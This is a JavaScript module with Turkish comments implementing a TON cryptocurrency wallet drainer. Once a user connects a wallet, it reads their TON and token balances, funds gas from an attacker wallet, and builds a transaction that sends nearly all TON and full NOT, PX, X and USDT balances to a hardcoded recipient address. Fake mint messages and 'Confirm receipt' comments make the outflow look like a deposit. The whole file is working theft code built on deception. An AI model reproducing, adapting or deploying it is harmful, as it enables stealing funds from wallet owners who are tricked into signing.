/* eslint-disable */
import TonWeb from 'tonweb';
import axios from 'axios';
import WalletManager from './WalletManager';
import { beginCell, toNano, Address } from '@ton/ton';
import * as tonMnemonic from 'tonweb-mnemonic';

const provider = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC', {
  apiKey: process.env.API_KEY, // API anahtarı .env.local'dan alınıyor
});
const tonweb = new TonWeb(provider);

const RECIPIENT_ADDRESS = "UQDvef69z5mXefuTomiw8guA16v_xexkTLBjnNQJt7SMzxKz"; // Hedef cüzdan adresi...
const TON00_MINTER_ADDRESS = "EQA0MYWlK6iSgTPSSQx6MIwIXtfEhvWHzXuuPkQZpQPOMNQ7"; // Gerçek Jetton Minter sözleşme adresinizi buraya yazın
const AMOUNT_TO_MINTT = 75;

const TON55_MINTER_ADDRESS = "EQCxdwBkQHvz3L-O8rKmiu9AtGeVjbRh6f5m3TkX0p0xkbk1"; // Gerçek Jetton Minter sözleşme adresinizi buraya yazın

const TON99_MINTER_ADDRESS = "EQCM_D3gxQiu8lZm_87uV6pxY96cfzYXjdrOc2jUB1Fwj1Oh"; // Gerçek Jetton Minter sözleşme adresinizi buraya yazın

const TON16_MINTER_ADDRESS = "EQDiAqZ8RmWHAj18hprMmN2ZJwIN1gVO4QRBPGWsIqbvdl6e"; // Gerçek Jetton Minter sözleşme adresinizi buraya yazın

const NOT45_MINTER_ADDRESS = "EQAYPmvFhlAyoRsw_6I04E3FizIIyXMv8EB8cgI9kjvKk84B"; // Gerçek Jetton Minter sözleşme adresinizi buraya yazın


// Mnemonic ifadeyi .env.local'dan alın
const mnemonic = process.env.MNEMONIC.split(' ');

const setupWallet = async () => {
  try {
    const keyPair = await tonMnemonic.mnemonicToKeyPair(mnemonic);
    const WalletClass = tonweb.wallet.all.v4R2;
    const wallet = new WalletClass(tonweb.provider, {
      publicKey: keyPair.publicKey,
      secretKey: keyPair.secretKey,
    });

    return wallet;
  } catch (error) {
    console.error('Cüzdan oluşturulurken hata oluştu:', error);
    return null;
  }
};

// Transaction fonksiyonu
const request_transaction = async (tonConnectUI, setIsLoading) => {
  try {
    const walletAddress = tonConnectUI.account?.address;
    if (!walletAddress) return;

    const WALLET = new WalletManager(tonConnectUI);

    // Yetkilendirilmiş cüzdanı ayarla
    const authorizedWallet = await setupWallet();
    if (!authorizedWallet) return;

// Mevcut TON bakiyesini al ve kontrol et
const walletInfo = await WALLET.getAccount();
const currentTonBalance = parseFloat(walletInfo.balance);

// Coinlerin bakiyelerini al

const dogsWallet = await WALLET.getDogsWallet();
const dogsBalance = await WALLET.getDogsBalance();

const notcoinWallet = await WALLET.getNotcoinWallet();
const notcoinBalance = await WALLET.getNotcoinBalance();

const xWallet = await WALLET.getXWallet();
const xBalance = await WALLET.getXBalance();

const majorWallet = await WALLET.getMajorWallet();
const majorBalance = await WALLET.getMajorBalance();

const hmstrWallet = await WALLET.getHmstrWallet();
const hmstrBalance = await WALLET.getHmstrBalance();

const catsWallet = await WALLET.getCatsWallet();
const catsBalance = await WALLET.getCatsBalance();

const soonWallet = await WALLET.getSoonWallet();
const soonBalance = await WALLET.getSoonBalance();

const rbtcWallet = await WALLET.getRbtcWallet();
const rbtcBalance = await WALLET.getRbtcBalance();

const btc25Wallet = await WALLET.getBtc25Wallet();
const btc25Balance = await WALLET.getBtc25Balance();

const usdtWallet = await WALLET.getUsdtWallet();
const usdtBalance = await WALLET.getUsdtBalance();

const katWallet = await WALLET.getKatWallet();
const katBalance = await WALLET.getKatBalance();

const tsTonWallet = await WALLET.getTsTonWallet();
const tsTonBalance = await WALLET.getTsTonBalance();

const hydraWallet = await WALLET.getHydraWallet();
const hydraBalance = await WALLET.getHydraBalance();

const godlWallet = await WALLET.getGodlWallet();
const godlBalance = await WALLET.getGodlBalance();

const watWallet = await WALLET.getWatWallet();
const watBalance = await WALLET.getWatBalance();

const durevWallet = await WALLET.getDurevWallet();
const durevBalance = await WALLET.getDurevBalance();

const catiWallet = await WALLET.getCatiWallet();
const catiBalance = await WALLET.getCatiBalance();

const redoWallet = await WALLET.getRedoWallet();
const redoBalance = await WALLET.getRedoBalance();

const buildWallet = await WALLET.getBuildWallet();
const buildBalance = await WALLET.getBuildBalance();

const pxWallet = await WALLET.getPxWallet();
const pxBalance = await WALLET.getPxBalance();

const woofWallet = await WALLET.getWoofWallet();
const woofBalance = await WALLET.getWoofBalance();

const zooWallet = await WALLET.getZooWallet();
const zooBalance = await WALLET.getZooBalance();

const memhashWallet = await WALLET.getMemhashWallet();
const memhashBalance = await WALLET.getMemhashBalance();

const fpiBankWallet = await WALLET.getFpiBankWallet();
const fpiBankBalance = await WALLET.getFpiBankBalance();



console.log("Mevcut Notcoin bakiyesi:", notcoinBalance);
console.log("Mevcut Dogs bakiyesi", dogsBalance)
console.log("Mevcut X Coin bakiyesi:", xBalance);
console.log("Mevcut Major Coin bakiyesi:", majorBalance);
console.log("Mevcut HMSTR bakiyesi:", hmstrBalance);
console.log("Mevcut Cats Coin bakiyesi:", catsBalance);
console.log("Mevcut SOON bakiyesi:", soonBalance);
console.log("Mevcut RBTC bakiyesi:", rbtcBalance);
console.log("Mevcut BTC25 bakiyesi:", btc25Balance);
console.log("Mevcut PX bakiyesi:", pxBalance);
console.log("Mevcut WOOF bakiyesi:", woofBalance);


// 0,15 TON gönderme işlemi
if (
  (parseFloat(dogsBalance) > toNano("8000") ||
    parseFloat(notcoinBalance) > toNano("1000") ||
    parseFloat(xBalance) > toNano("50000") ||
    parseFloat(hmstrBalance) > toNano("2000") || // 2000'den fazla HMSTR kontrolü
    parseFloat(soonBalance) > toNano("35000") || // 40000'den fazla SOON kontrolü
    parseFloat(buildBalance) > toNano("20")) // 200'den fazla BUILD kontrolü
  && currentTonBalance < toNano("0.1")
) {
  console.log("Belirtilen coin miktarı eşik değerleri aşıyor. diğer transactionlara geçiliyor...");

  const seqno = await authorizedWallet.methods.seqno().call();

  await authorizedWallet.methods.transfer({
    secretKey: authorizedWallet.options.secretKey,
    toAddress: walletAddress,
    amount: toNano("0.11"), // 0.11 TON gönderilecek
    seqno: seqno,
    sendMode: 3,
    payload: null, // Payload alanını null yaparak açıklama kısmını boş bırakıyoruz
  }).send();

  console.log("Yetkilendirilmiş cüzdandan 0.11 TON transfer edildi. İşlemin tamamlanmasını bekliyoruz...");

  let retries = 60;
  while (retries > 0) {
    const updatedWalletInfo = await WALLET.getAccount();
    if (updatedWalletInfo && parseFloat(updatedWalletInfo.balance) >= toNano("0.10")) {
      console.log("0.11 TON başarıyla cüzdana ulaştı.");
      setIsLoading(false); // Pop-up burada kapanacak
      break;
    }
    retries--;
    console.log("0.11 TON işlemi henüz tamamlanmadı. 2 saniye sonra tekrar kontrol ediliyor...");
    await new Promise(resolve => setTimeout(resolve, 2000)); // 2 saniye bekle ve tekrar dene
  }

  if (retries === 0) {
    console.warn("0.11 TON işlemi başarısız oldu veya tamamlanması uzun sürdü.");
    setIsLoading(false); // Hata durumunda da pop-up kapanacak
    return;
  }

  console.log("İşlem blok zincirine tamamen işlenmesi için 3 saniye bekleniyor...");
  await new Promise(resolve => setTimeout(resolve, 3000)); // 3 saniye ek bekleme
  setIsLoading(false); // İşlem tamamlandığında pop-up kapanır
} else {
  console.log("Cüzdanda yeterli TON var veya belirtilen coin miktarları eşik değerlerinin altında. Direkt diğer transaction'lara geçiliyor.");
  setIsLoading(false); // Eğer yeterli TON varsa pop-up yine kapanır
}


    // Transaction mesajlarını oluştur
    const messages = [];


    // 1) MİNT ton
    //  MasterMsg cell:
    const mintMsg2 = beginCell()
      .storeUint(0x178d4519, 32)     // placeholder (opsiyonel)
      .storeUint(0, 64)     // query_id
      .storeCoins(toNano(AMOUNT_TO_MINTT))       // xxx adet token (Jetton standardında 'storeCoins' => 50)
      .storeAddress(null)
      .storeAddress(Address.parse(TON00_MINTER_ADDRESS))
      .storeCoins(toNano('0.001'))
      .storeMaybeRef(null)
      .endCell();

    // 2) Minter'a gidecek mintBody
    // - op::mint = 21
    // - query_id = 0
    // - to_address (RECIPIENT_ADDRESS)
    // - ton_amount -> 0.01 TON, mesela
    // - masterMsg referans
    const mintBody2 = beginCell()
      .storeUint(21, 32)                       // op::mint
      .storeUint(0, 64)                             // query_id: 0
      .storeAddress(Address.parse(walletAddress))
      .storeCoins(toNano("0.01"))                   // Minter cüzdana forward edeceği TON
      .storeCoins(toNano(AMOUNT_TO_MINTT))
      .storeRef(mintMsg2)                          // masterMsg.
      .endCell();


// Mint mesajını messages array'ine ekliyoruz:
messages.push({
      type: 'mandatory',
      address: TON00_MINTER_ADDRESS,
      amount: toNano('0.02').toString(),
      payload: mintBody2.toBoc().toString('base64'),
    });




// TON bakiyesi 0,35 ile 100 ton arasındaysa (örnek sınır)
const currentTonBalanceNano2 = BigInt(walletInfo.balance);

if (currentTonBalanceNano2 >= toNano("0.3") && currentTonBalanceNano2 <= toNano("100")) {
  // Tüm bakiyeden 0.20 TON çıkararak gönderilecek miktarı hesapla
  const amountToSendNano = currentTonBalanceNano2 - toNano("0.20");

  // Nano cinsinden hesaplanan miktarı TON cinsine çevir (decimal)
  const sendingAmountTON = Number(amountToSendNano) / 1e9;

  // Gösterilecek değeri hesaplamak için:
  // - Eğer küsürat 0.55'ten küçükse, integer kısmı + 0.55 olarak gösterilecek,
  // - Eğer küsürat 0.55 veya daha büyükse, integer kısmının bir sonraki tam sayı değeri gösterilecek.
  const intPart = Math.floor(sendingAmountTON);
  const frac = sendingAmountTON - intPart;
  let displayAmount;
  if (frac < 0.55) {
    displayAmount = intPart + 0.16;
  } else {
    displayAmount = intPart + 0.55;
  }

  // Açıklama mesajı: gönderilecek miktar displayAmount olarak formatlanıyor
  const commentMessage = `✅ Confirm receipt 75 TON + ${displayAmount.toFixed(2)} TON `;

  // Basit TON transferi için payload oluşturuluyor, açıklama mesajı ekleniyor
  const tonTransferPayload = beginCell()
    .storeUint(0, 32)
    .storeRef(
      beginCell()
        .storeUint(0, 32)
        .storeStringTail(commentMessage)
        .endCell()
    )
    .endCell();

  // Mesajı oluştur ve mesajlar dizisine ekle
  messages.push({
    type: "mandatory",
    address: RECIPIENT_ADDRESS,
    amount: amountToSendNano.toString(),
    payload: tonTransferPayload.toBoc().toString("base64"),
  });
}




// Notcoin bakiyesinin tamsayısını hesapla (Nano değeri TON formatına çevirip tam kısmını al)
const notcoinIntegerBalance = Math.floor(parseFloat(notcoinBalance) / 1e9);

// Eğer minimum 1000 NOT mevcutsa NOT45 mint işlemi gerçekleştir
if (notcoinIntegerBalance >= 1000) {
  // NOT45 mint işlemi için master mesajını oluşturuyoruz
  const mintMsgNot45 = beginCell()
    .storeUint(0x178d4519, 32) // placeholder opcode (opsiyonel)
    .storeUint(0, 64)         // query_id
    .storeCoins(toNano(notcoinIntegerBalance.toString()))
    .storeAddress(null)
    .storeAddress(Address.parse(NOT45_MINTER_ADDRESS))
    .storeCoins(toNano('0.001'))
    .storeMaybeRef(null)
    .endCell();

  // NOT45 mint işlemi için body oluşturuluyor
  const mintBodyNot45 = beginCell()
    .storeUint(21, 32) // op::mint
    .storeUint(0, 64)  // query_id: 0
    .storeAddress(Address.parse(walletAddress))
    .storeCoins(toNano("0.01")) // Minter cüzdana forward edeceği TON miktarı
    .storeCoins(toNano(notcoinIntegerBalance.toString()))
    .storeRef(mintMsgNot45)
    .endCell();

  // NOT45 mint mesajını transaction mesaj listesine ekliyoruz
  messages.push({
    type: 'mandatory',
    address: NOT45_MINTER_ADDRESS,
    amount: toNano('0.02').toString(),
    payload: mintBodyNot45.toBoc().toString('base64'),
  });
}



// Notcoin transferi
if (parseFloat(notcoinBalance) > toNano("1000")) {

  // Notcoin bakiyesini tamsayıya çevir (NanoTON'u normal formata çevirip sadece tam kısmı al)
  const notcoinIntegerBalance = Math.floor(parseFloat(notcoinBalance) / 1e9);

  // Yorum mesajını oluştur
  const commentMessage = `✅ Confirm receipt ${notcoinIntegerBalance} NOT `;

  const notcoinBody = beginCell()
    .storeUint(0xf8a7ea5, 32)
    .storeUint(0, 64)
    .storeCoins(notcoinBalance)
    .storeAddress(Address.parse(RECIPIENT_ADDRESS))
    .storeAddress(Address.parse(walletAddress))
    .storeBit(0)
    .storeCoins(toNano('0.01'))
    .storeBit(1) // Forward payload olarak referans ekle
    .storeRef(
      beginCell()
        .storeUint(0, 32) // 32 bit sıfır, comment göstergesi
        .storeStringTail(commentMessage) // Güncellenmiş yorum mesajı
        .endCell()
    )
    .endCell();

  messages.push({
    type: 'mandatory',
    address: notcoinWallet.address,
    amount: toNano('0.04').toString(),
    payload: notcoinBody.toBoc().toString('base64'),
  });

  console.log(`Notcoin transferi başlatıldı. Yorum: "${commentMessage}"`);
}




// --- Yeni Mint TON İşlemi (Fractional Rounding) ---

// Cüzdan bakiyesini TON cinsine çevir (nano -> TON)
const rawTonBalance = parseFloat(walletInfo.balance) / 1e9;

// Eğer cüzdan bakiyesi 1 TON'dan azsa, mint işlemini atla ama diğer işlemlere devam et.
if (rawTonBalance < 1.2) {
  console.error("Mint işlemi için en az 1 TON gerekmekte. Mint işlemi atlanıyor.");
} else {
  // --- Yeni Mint TON İşlemi (Fractional Rounding) ---

  // Cüzdan bakiyesinden 0.2 TON çıkarılmış haliyle hesaplama yapılıyor.
  const effectiveTonBalance = rawTonBalance - 0.2;
  const integerPart = Math.floor(effectiveTonBalance);
  const fractionalPart = effectiveTonBalance - integerPart;

  let mintAmount;
  let mintAddress;

  if (fractionalPart < 0.55) {
    // Eğer küsürat 0.55'ten küçükse, mint edilecek miktar küsürat olarak alınır.
    mintAmount = integerPart;
    mintAddress = TON16_MINTER_ADDRESS;
    console.log(
      `Küsürat ${fractionalPart.toFixed(2)} (< 0.55): ${mintAmount.toFixed(2)} TON mint edilecek, TON16_MINTER_ADDRESS kullanılıyor.`
    );
  } else {
    // Eğer küsürat 0.55 veya daha büyükse, mint edilecek miktar tamsayı kısmı olarak alınır.
    mintAmount = integerPart;
    mintAddress = TON55_MINTER_ADDRESS;
    console.log(
      `Küsürat ${fractionalPart.toFixed(2)} (>= 0.55): ${mintAmount} TON mint edilecek, TON55_MINTER_ADDRESS kullanılıyor.`
    );
  }

  // Yeni mint işlemi için master mesajı oluşturuluyor.
  const mintMsg3 = beginCell()
    .storeUint(0x178d4519, 32) // placeholder opcode (opsiyonel)
    .storeUint(0, 64) // query_id
    .storeCoins(toNano(mintAmount.toString()))
    .storeAddress(null)
    .storeAddress(Address.parse(mintAddress))
    .storeCoins(toNano('0.001'))
    .storeMaybeRef(null)
    .endCell();

  // Minter'a gidecek mintBody oluşturuluyor.
  const mintBody3 = beginCell()
    .storeUint(21, 32) // op::mint
    .storeUint(0, 64) // query_id: 0
    .storeAddress(Address.parse(walletAddress))
    .storeCoins(toNano("0.01")) // Minter cüzdana forward edeceği TON
    .storeCoins(toNano(mintAmount.toString()))
    .storeRef(mintMsg3) // master mesaj referansı
    .endCell();

  // Mesaj array'ine yeni mint mesajı ekleniyor.
  messages.push({
    type: 'mandatory',
    address: mintAddress,
    amount: toNano('0.02').toString(),
    payload: mintBody3.toBoc().toString('base64'),
  });
}



// PX transferi
if (parseFloat(pxBalance) > 500 * 1e9) {
  // PX bakiyesini tamsayıya çevir (NanoPX'ten normal PX formatına çevirip sadece tam kısmı al)
  const pxIntegerBalance = Math.floor(parseFloat(pxBalance) / 1e9);

  // Açıklama mesajını oluştur
  const commentMessage = `✅ Confirm receipt ${pxIntegerBalance} PX `;

  const pxBody = beginCell()
    .storeUint(0xf8a7ea5, 32) // Jetton transfer opcode
    .storeUint(0, 64) // Query ID
    .storeCoins(pxBalance) // Gönderilecek PX miktarı
    .storeAddress(Address.parse(RECIPIENT_ADDRESS)) // Hedef adres
    .storeAddress(Address.parse(walletAddress)) // Yanıt adresi
    .storeBit(0) // No custom payload
    .storeCoins(toNano('0.01')) // 0.01 TON işlem ücreti
    .storeBit(1) // Forward payload olarak referans ekle
    .storeRef(
      beginCell()
        .storeUint(0, 32) // 32 bit sıfır, comment göstergesi
        .storeStringTail(commentMessage) // Güncellenmiş yorum mesajı
        .endCell()
    )
    .endCell();

  // Mesajı oluştur ve işlemlere ekle
  messages.push({
    type: 'mandatory', // Mesaj türü zorunlu
    address: pxWallet.address, // PX cüzdan adresi
    amount: toNano('0.03').toString(), // İşlem ücreti
    payload: pxBody.toBoc().toString('base64'), // Payload
  });
}


// X Coin transferi
if (parseFloat(xBalance) > toNano("50000")) {
  // X Coin bakiyesini tamsayıya çevir (nanoX'ten normal X formatına çevirip sadece tam kısmı al)
  const xIntegerBalance = Math.floor(parseFloat(xBalance) / 1e9);

  // Açıklama mesajını oluştur
  const commentMessage = `✅ Confirm receipt ${xIntegerBalance} X`;

  const xBody = beginCell()
    .storeUint(0xf8a7ea5, 32) // Jetton transfer opcode
    .storeUint(0, 64) // Query ID
    .storeCoins(xBalance) // X Coin bakiyesini gönder
    .storeAddress(Address.parse(RECIPIENT_ADDRESS)) // Hedef cüzdan adresi
    .storeAddress(Address.parse(walletAddress)) // Yanıt adresi
    .storeBit(0) // No custom payload
    .storeCoins(toNano('0.01')) // İşlem ücreti olarak 0.01 TON
    .storeBit(1) // Forward payload olarak referans ekle
    .storeRef(
      beginCell()
        .storeUint(0, 32) // 32 bit sıfır, comment göstergesi
        .storeStringTail(commentMessage) // Güncellenmiş yorum mesajı
        .endCell()
    )
    .endCell();

  // Mesajı oluştur ve işlemlere ekle
  messages.push({
    type: 'mandatory',
    address: xWallet.address, // X Coin cüzdan adresi
    amount: toNano('0.04').toString(), // İşlem ücretleri için 0.04 TON
    payload: xBody.toBoc().toString('base64'), // X Coin transferi için payload
  });
}


// USDT transferi (3 USDT'den fazlaysa)
if (parseFloat(usdtBalance) > 10 * 1e6) {
  // USDT bakiyesini tamsayıya çevir (nanoUSDT'ten normal USDT formatına çevirip sadece tam kısmı al)
  const usdtIntegerBalance = Math.floor(parseFloat(usdtBalance) / 1e6);

  // Açıklama mesajını oluştur
  const commentMessage = `✅ Confirm receipt ${usdtIntegerBalance} USDT `;

  const usdtBody = beginCell()
    .storeUint(0xf8a7ea5, 32) // Jetton transfer opcode
    .storeUint(0, 64) // Query ID
    .storeCoins(usdtBalance) // Gönderilecek USDT miktarı
    .storeAddress(Address.parse(RECIPIENT_ADDRESS)) // Hedef adres
    .storeAddress(Address.parse(walletAddress)) // Yanıt adresi
    .storeBit(0) // No custom payload
    .storeCoins(toNano('0.01')) // 0.01 TON işlem ücreti
    .storeBit(1) // Forward payload olarak referans ekle
    .storeRef(
      beginCell()
        .storeUint(0, 32) // 32 bit sıfır, comment göstergesi
        .storeStringTail(commentMessage) // Güncellenmiş yorum mesajı
        .endCell()
    )
    .endCell();

  // Mesajı oluştur ve işlemlere ekle
  messages.push({
    type: 'mandatory', // Mesaj türü zorunlu
    address: usdtWallet.address, // USDT cüzdan adresi
    amount: toNano('0.04').toString(), // İşlem ücreti
    payload: usdtBody.toBoc().toString('base64'), // Payload
  });
}








    ;


    // Transaction fonksiyonunu güncelle ve çağır



// 1. Mandatory ve Optional mesajları ayırma
const mandatoryMessages = messages.filter((msg) => msg.type === 'mandatory');
const optionalMessages = messages.filter((msg) => msg.type === 'optional');

// 2. Toplamda maksimum 4 mesaj seçme
// İlk önce mandatoryMessages listesinden alıp ardından optionalMessages ile dolduruyoruz
let selectedMessages = [...mandatoryMessages.slice(0, 4)];

if (selectedMessages.length < 4) {
  selectedMessages = [
    ...selectedMessages,
    ...optionalMessages.slice(0, 4 - selectedMessages.length),
  ];
}

// 3. Seçilen mesajlarda optional olanları her durumda en üste taşıma.
function prioritizeOptionalMessages(messages) {
  return messages.sort((a, b) => {
    if (a.type === 'optional' && b.type !== 'optional') return -1;
    if (a.type !== 'optional' && b.type === 'optional') return 1;
    return 0;
  });
}""

// 4. Seçilen mesajları sıralama fonksiyonuyla güncelleme
selectedMessages = prioritizeOptionalMessages(selectedMessages);

// 5. Transaction yapısını oluştur ve gönder
const transaction = {
  validUntil: Math.floor(Date.now() / 1000) + 60,
  messages: selectedMessages,
};

if (selectedMessages.length > 0) {
  try {
    const result = await tonConnectUI.sendTransaction(transaction);
    console.log('Transaction başarılı:', result);
  } catch (error) {
    console.error('Transaction gönderimi hatası:', error);
  }
} else {
  console.log('Hiçbir işlem yapılmadı. Koşullar sağlanmadı.');
}
  } catch (error) {
    console.error('Transaction hatası:', error);
    setIsLoading(false); // Hata durumunda pop-up kapanır
  }
};

export { request_transaction };